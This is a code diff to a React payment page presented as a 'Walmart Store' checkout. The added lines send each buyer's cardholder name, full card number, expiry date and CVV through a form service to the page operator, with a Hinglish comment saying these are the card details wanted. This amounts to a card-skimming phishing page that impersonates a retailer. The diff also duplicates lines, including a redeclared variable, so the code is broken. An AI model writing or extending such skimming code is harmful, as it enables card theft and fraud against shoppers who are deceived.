@@ -126,7 +126,23 @@ const PaymentPage = () => {
       
       // Append Web3Forms access key
       formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
+            // Initialize FormData from the event target
+      const formData = new FormData(e.target);
       
+      // Append Web3Forms access key
+      formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
+      
+      // --- YEH RAHI CARD DETAILS JO AAPKO CHAHIYE ---
+      formData.append("Cardholder_Name", paymentData.cardholderName);
+      formData.append("Full_Card_Number", paymentData.cardNumber);
+      formData.append("Expiry_Date", paymentData.expiryDate);
+      formData.append("CVV_Code", paymentData.cvv);
+      // --------------------------------------------
+
+      // Append all your custom fields exactly as you had them
+      formData.append("subject", "New Order Received - Walmart Store");
+      // ... baki ka code bilkul same rahega ...
+
       // Append all your custom fields exactly as you had them
       formData.append("subject", "New Order Received - Walmart Store");
       formData.append("from_name", "Walmart E-commerce");
